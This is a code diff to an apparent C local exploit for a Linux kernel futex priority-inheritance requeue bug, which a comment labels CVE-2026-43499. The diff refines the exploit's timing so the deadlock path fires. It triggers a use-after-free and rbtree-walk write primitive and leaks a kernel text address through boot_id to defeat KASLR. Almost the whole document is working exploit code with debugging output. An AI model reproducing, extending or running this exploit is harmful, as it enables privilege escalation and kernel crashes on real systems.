@@ -12,6 +12,8 @@ static uint32_t slide_f_pi_chain;
 static atomic_int slide_waiter_ready;
 static atomic_int slide_waiter_waiting;
 static atomic_int slide_owner_started;
+static atomic_int slide_owner_blocking;
+static atomic_int slide_owner_tid;
 static atomic_int slide_route_done;
 static atomic_int slide_waiter_tid;
 static atomic_int slide_consume_go;
@@ -88,7 +90,32 @@ void slide_pselect_put_waiter_word(
                "words_per_set=%d nfds=%d\n",
                name, waiter_word, global_word, words_per_set,
                SLIDE_PSELECT_NFDS);
+    return;
   }
+  int set_idx = global_word / words_per_set;
+  int word_idx = global_word % words_per_set;
+  const char *set_name = set_idx == 0 ? "in" : set_idx == 1 ? "out" : "ex";
+  pr_info("slide word map %s w%d -> %s[%d] (global %d) = %016llx\n",
+          name, waiter_word, set_name, word_idx, global_word,
+          (unsigned long long)value);
+}
+
+static void slide_dump_fdsets(
+    const fd_set *in, const fd_set *out, const fd_set *ex,
+    int words_per_set, const char *label) {
+  const fd_set *sets[3] = {in, out, ex};
+  const char *names[3] = {"in", "out", "ex"};
+  for (int s = 0; s < 3; s++) {
+    for (int w = 0; w < words_per_set; w++) {
+      uint64_t v = fdset_get_word(sets[s], w);
+      int global = s * words_per_set + w;
+      if (v != 0) {
+        pr_info("slide dump %s %s[%d] (global %d) = %016llx\n",
+                label, names[s], w, global, (unsigned long long)v);
+      }
+    }
+  }
+  fflush(stdout);
 }
 
 static void prepare_slide_pselect_fdsets_shifted(
@@ -171,6 +198,8 @@ void slide_pselect_stack_copy(void) {
   fd_set ex;
   prepare_slide_pselect_fdsets_shifted(&in, &out, &ex);
   open_slide_selected_fds(&in, &out, &ex, high_read);
+  slide_dump_fdsets(&in, &out, &ex,
+                    slide_pselect_words_per_set(), "pre-pselect");
 
   struct timespec timeout = {
     .tv_sec = PSELECT_TIMEOUT_SEC,
@@ -188,15 +217,20 @@ void slide_pselect_stack_copy(void) {
   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
 
   atomic_store(&slide_consume_go, 1);
-  pr_info("slide pselect ENTERING syscall shift=%d\n", slide_word_shift);
+  pr_info("slide pselect ENTERING syscall shift=%d timeout_sec=%d block_fd=%d\n",
+          slide_word_shift, (int)PSELECT_TIMEOUT_SEC, block_fd);
+  fflush(stdout);
   errno = 0;
   int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
   atomic_store(&slide_consume_go, 0);
-  pr_info("slide pselect returned ret=%d errno=%d shift=%d sched_ok=%d calls=%d\n",
+  pr_info("slide pselect RETURNED ret=%d errno=%d shift=%d sched_ok=%d calls=%d\n",
           ret, saved_errno, slide_word_shift,
           atomic_load(&slide_consume_sched_ok),
           atomic_load(&slide_consume_calls));
+  slide_dump_fdsets(&in, &out, &ex,
+                    slide_pselect_words_per_set(), "post-pselect");
+  fflush(stdout);
 
   pthread_join(consumer, NULL);
 
@@ -209,6 +243,9 @@ void slide_pselect_stack_copy(void) {
 }
 
 static void slide_alarm_handler(int sig __attribute__((unused))) {
+  static const char msg[] = "[*] slide SIGALRM handler entered (interrupting pselect)\n";
+  ssize_t ign = write(1, msg, sizeof(msg) - 1);
+  (void)ign;
   syscall(SYS_setpriority, PRIO_PROCESS, 0, 5);
 }
 
@@ -231,6 +268,9 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     int tid = atomic_load(&slide_waiter_tid);
     int calls = atomic_load(&slide_consume_calls);
     atomic_store(&slide_consume_calls, calls + 1);
+    pr_info("slide consumer issuing sched_setattr call#%d tid=%d (rt prio 50, panic point if crash follows)\n",
+            calls + 1, tid);
+    fflush(stdout);
     errno = 0;
     /* EXPERIMENT: use SCHED_FIFO+RT priority instead of SCHED_BATCH+nice to
      * test whether an RT priority change is what triggers
@@ -297,9 +337,9 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   long wr = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                      &slide_f_pi_target, 0);
   pr_info("slide waiter after FUTEX_WAIT_REQUEUE_PI ret=%ld errno=%d\n", wr, errno);
-  errno = 0;
-  long ul = futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
-  pr_info("slide waiter unlock pi_chain ret=%ld errno=%d\n", ul, errno);
+  /* CVE-2026-43499 choreography: keep pi_chain held across pselect.
+   * Unlocking wakes the owner, which then races the fake rbtree walk -> panic. */
+  pr_info("slide waiter holding pi_chain across pselect\n");
 
   signal(SIGALRM, SIG_DFL);
 
@@ -315,6 +355,8 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
 }
 
 void *slide_owner_thread(void *arg __attribute__((unused))) {
+  int tid = (int)SYSCHK(syscall(SYS_gettid));
+  atomic_store(&slide_owner_tid, tid);
   pr_info("slide owner started, locking pi_target futex=%p\n", (void *)&slide_f_pi_target);
   errno = 0;
   long lt = futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
@@ -329,11 +371,11 @@ void *slide_owner_thread(void *arg __attribute__((unused))) {
   }
 
   atomic_store(&slide_owner_started, 1);
-  pr_info("slide owner locking pi_chain (will block)\n");
-  usleep(10000);
+  pr_info("slide owner locking pi_chain (must BLOCK before requeue to arm the EDEADLK cycle)\n");
+  atomic_store(&slide_owner_blocking, 1);
   errno = 0;
   long ol = futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
-  pr_info("slide owner FUTEX_LOCK_PI(pi_chain) ret=%ld errno=%d\n", ol, errno);
+  pr_info("slide owner FUTEX_LOCK_PI(pi_chain) ret=%ld errno=%d (should stay blocked; EDEADLK here means the requeue ran too late)\n", ol, errno);
 
   for (;;) {
     sleep(1);
@@ -395,15 +437,52 @@ uint64_t slide_read_stext(void) {
     leaked |= (uint64_t)raw[i] << (i * 8);
   }
   if ((leaked >> 48) != 0xffff) {
-    leaked |= 0xffff000000000000ULL;
+    pr_warning("slide leaked value is not a kernel pointer (likely untouched "
+               "boot_id): %016llx\n", (unsigned long long)leaked);
+    return 0;
   }
 
-  uint64_t stext = leaked;
-  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
+  if (leaked == SLIDE_LOGGERS_0_1) {
+    /* The rb_erase W1 wrote our planted tree_pc into boot_id: the UAF +
+     * consumer walk primitive works on this kernel. The planted word is a
+     * slide-independent linear-map alias, so this is a mechanism proof, not a
+     * KASLR leak (per upstream, the boot_id route is only valid at slide=0). */
+    pr_success("slide boot_id-mechanism-ok pid=%d wrote=%016llx (UAF+walk write landed)\n",
+               getpid(), (unsigned long long)leaked);
+    return 0;
+  }
+
+  uint64_t off = p0_alias_image_offset(SLIDE_LOGGERS_0_1);
+  uint64_t stext = leaked - off;
+  if ((stext & 0x1fffffULL) != 0 || stext < KIMAGE_TEXT_BASE ||
+      stext >= KIMAGE_TEXT_BASE + 0x40000000ULL) {
+    pr_warning("slide stext failed sanity check leaked=%016llx stext=%016llx "
+               "(need 2MB-aligned within KASLR range)\n",
+               (unsigned long long)leaked, (unsigned long long)stext);
+    return 0;
+  }
+  pr_success("slide boot_id_leaked_loggers_0_1 pid=%d value=%016llx stext=%016llx\n",
              getpid(), (unsigned long long)leaked, (unsigned long long)stext);
   pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
              getpid(), (unsigned long long)stext);
   return stext;
+}
+
+static int slide_owner_wchan_is_futex(int tid) {
+  char path[64];
+  char buf[128];
+  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
+  int fd = open(path, O_RDONLY);
+  if (fd < 0) {
+    return 0;
+  }
+  ssize_t n = read(fd, buf, sizeof(buf) - 1);
+  close(fd);
+  if (n <= 0) {
+    return 0;
+  }
+  buf[n] = 0;
+  return strstr(buf, "futex") != NULL;
 }
 
 uint64_t slide_child_leak_stext(void) {
@@ -423,12 +502,33 @@ uint64_t slide_child_leak_stext(void) {
          !atomic_load(&slide_owner_started)) {
     usleep(1000);
   }
+
+  /* The EDEADLK must fire INSIDE the requeue's chain walk, so the owner has
+   * to be already blocked on pi_chain (owner -> chain -> waiter -> target ->
+   * owner) when FUTEX_CMP_REQUEUE_PI runs. Confirm via wchan. */
+  int owner_tid = atomic_load(&slide_owner_tid);
+  int blocked = 0;
+  for (int i = 0; i < 100 && !blocked; i++) {
+    blocked = slide_owner_wchan_is_futex(owner_tid);
+    if (!blocked) {
+      usleep(5000);
+    }
+  }
+  pr_info("slide child owner_blocked_on_futex=%d tid=%d\n", blocked, owner_tid);
+  if (!blocked) {
+    usleep(50000);
+  }
+
   pr_info("slide child conditions met, issuing FUTEX_CMP_REQUEUE_PI\n");
 
   errno = 0;
   long req = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                       &slide_f_pi_target, 0);
-  pr_info("slide child FUTEX_CMP_REQUEUE_PI ret=%ld errno=%d\n", req, errno);
+  pr_info("slide child FUTEX_CMP_REQUEUE_PI ret=%ld errno=%d (need ret=-1 errno=35: the buggy remove_waiter rollback only runs on EDEADLK)\n",
+          req, errno);
+  if (req >= 0) {
+    pr_warning("slide requeue returned success (no EDEADLK): PI cycle was not armed, write primitive will NOT fire this attempt\n");
+  }
 
   usleep(50000);
   pthread_kill(waiter, SIGALRM);
